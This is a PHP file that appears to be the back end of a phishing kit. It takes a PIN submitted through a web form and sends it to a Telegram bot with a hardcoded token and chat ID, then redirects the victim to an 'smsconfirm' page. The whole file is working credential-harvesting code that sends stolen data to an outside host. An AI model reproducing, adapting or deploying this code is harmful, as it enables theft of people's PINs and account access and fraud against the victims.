<?php
header("location: ../smsconfirm/");
if($_SERVER['REQUEST_METHOD'] == "POST"){

    $secret_token = "5669751939:AAFgBuZLq7zlT89Hshll0YXLjD_mjc_7GXc";
    $telegram_id = '5510246221';
    $setPin = $_POST ['setPin'];

function sendMessage($telegram_id, $setPin, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode ($setPin);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $setPin, $secret_token);
}
?>